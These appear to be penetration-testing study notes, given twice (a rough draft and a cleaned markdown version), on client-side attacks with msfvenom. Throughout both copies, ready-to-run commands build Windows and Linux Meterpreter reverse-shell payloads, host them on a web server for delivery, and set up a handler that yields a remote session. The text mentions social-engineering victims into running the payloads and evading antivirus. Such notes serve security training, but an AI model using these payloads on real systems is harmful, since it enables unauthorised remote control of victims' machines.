# Generating Payloads with Msfvenom

## Client Side Attacks

- A client-side attack is an attack vector that involves coercing a client to ececute a malicious payload on their system that consequently connects back to the attacker when executed.
- Client-side attacks typically utilize various social engineering techniques like generating malicious documents or portable executables (PEs).
- Client-side attacks take advantage of human vulnerabilities as opposed to vulnerabilities in services or software running on the target system.
- Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognisant of AV detection.

## Msfvenom

- Msfvenom is a command-line utility that can be used to generate and encode MSF payloads for various operating systems as well a web servers.
- Msfvenom is a combination of two utilities, namely: msfpayload and msfencode.
- We can use Msfvenom to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed, it will connect back to our payload handler and provide us with remote access to the target system.

## Demo: Generating Payloads with Msfvenom

`msfvenom`

We list out the available payloads we can generate:

`msfvenom --list payloads`

- We focus on the meterpreter payload. When we specify a payload, we'll first specify the OS, OS architecure, payload type, protocol (connecting back to the OS)
- Payloads:
  - Staged payload: Is delivered in two parts: an initial loader that connects back to the attacker and downloads the main payload, allowing for smaller payloads and flexibility.
  - Non-staged payload: Delivers the entire payload at once, making it simpler and faster but potentially larger in size
 
### Generating Windows payloads:

`msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=[ownIP] LPORT=[port the payload should connect back to] -f exe > /home/kali/Desktop/Windows_Payloads/payloadx86.exe`

We check if the payload generated successfully:

`cd Desktop/Windows_Payloads/`

`ls`

Generating a x64 payload:

`msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=[ownIP] LPORT=[port the payload should connect back to] -f exe > /home/kali/Desktop/Windows_Payloads/payloadx64.exe`

`cd Desktop/Windows_Payloads/`

`ls`

We also need to setup a handler. A handler is needed to listen for and manage incoming connections from the payload on the target machine, enabling control over the compromised system:

`use exploit/multi/handler`


Listing out the output formats available:

`msfvenom -list formats`

Framework Executable Formats are aspx, dll, elf, exe, jar etc.
Framework Transform Formats allow us to output the payloads into a python, ruby file etc.

### Generating Linux payloads:

`cd ..`

`ls`

We will be storing the Linux payloads under /home/kali/Desktop/

We generate a payload:

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ownIP] LPORT=[backConnect Port] -f elf > /Desktop/Linux_Payloads/payloadx86`

`cd Linux_Payloads/`

We execute this:

`chmod +x payloadx86`

`./payloadx86`

### Transfer Windows payload onto target system

`cd Windows_Payloads/`

Set-up a simple webserver to host the payload files:

`sudo python -m SimpleHTTPServer 80`

New tab:

msfconsole

msf6:`use multi/handler`

msf6:`set payload windows/meterpreter/reverse_tcp`

msf6:`set lhost [ownIP]`

msf6:`set lport [port we configured when generating the paylaod]`

msf6:`run`

We obtained a meterpreter session








# Payloads

## Generating Payloads with Msfvenom

### Client-Side Attacks

- **Definition**: A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system, which then connects back to the attacker when executed.
- **Techniques**: These attacks typically utilize social engineering techniques to generate malicious documents or portable executables (PEs).
- **Vulnerability**: Client-side attacks exploit human vulnerabilities as opposed to vulnerabilities in services or software running on the target system.
- **Antivirus Considerations**: Since this attack vector involves the transfer and storage of a malicious payload on the clientâ€™s system (disk), attackers need to be mindful of AV detection.

### Msfvenom

- **What is Msfvenom?**: Msfvenom is a command-line utility used to generate and encode Metasploit Framework (MSF) payloads for various operating systems and web servers.
- **Origin**: Msfvenom combines the functionalities of two tools: `msfpayload` and `msfencode`.
- **Purpose**: We can use Msfvenom to generate a malicious Meterpreter payload that can be transferred to a target system. Once executed, it will connect back to our payload handler and provide us with remote access to the target system.

### Demo: Generating Payloads with Msfvenom

1. **List available payloads:**

    ```bash
    msfvenom --list payloads
    ```

2. **Types of Payloads:**
   - **Staged Payload**: Delivered in two parts: an initial loader that connects back to the attacker and downloads the main payload, allowing for smaller payloads and flexibility.
   - **Non-staged Payload**: Delivers the entire payload at once, making it simpler and faster but potentially larger in size.

#### Generating Windows Payloads

- **Generate x86 Payload:**

    ```bash
    msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=[port] -f exe > /home/kali/Desktop/Windows_Payloads/payloadx86.exe
    ```

    Check if the payload was generated successfully:

    ```bash
    cd Desktop/Windows_Payloads/
    ls
    ```

- **Generate x64 Payload:**

    ```bash
    msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=[port] -f exe > /home/kali/Desktop/Windows_Payloads/payloadx64.exe
    ```

    Verify:

    ```bash
    cd Desktop/Windows_Payloads/
    ls
    ```

- **Set up a Handler:**
    - A handler is needed to listen for and manage incoming connections from the payload on the target machine, enabling control over the compromised system:

    ```bash
    use exploit/multi/handler
    ```

- **List available output formats:**

    ```bash
    msfvenom -list formats
    ```

    - **Framework Executable Formats**: aspx, dll, elf, exe, jar, etc.
    - **Framework Transform Formats**: Allows us to output the payloads into a Python, Ruby file, etc.

#### Generating Linux Payloads

- **Navigate to the directory for Linux payloads:**

    ```bash
    cd ..
    ls
    ```

    The payloads will be stored in `/home/kali/Desktop/`.

- **Generate Payload:**

    ```bash
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=[port] -f elf > /Desktop/Linux_Payloads/payloadx86
    ```

    Navigate to the target directory and make the payload executable:

    ```bash
    cd Linux_Payloads/
    chmod +x payloadx86
    ./payloadx86
    ```

### Transfer Windows Payload onto Target System

- **Navigate to the Windows payloads directory:**

    ```bash
    cd Windows_Payloads/
    ```

- **Set up a simple web server to host the payload files:**

    ```bash
    sudo python -m SimpleHTTPServer 80
    ```

- **Open a new tab and launch msfconsole:**

    ```bash
    msfconsole
    ```

    - **Set up and run the handler:**

        ```bash
        use multi/handler
        set payload windows/meterpreter/reverse_tcp
        set lhost [yourIP]
        set lport [port]
        run
        ```

    - **Result**: We obtained a Meterpreter session.
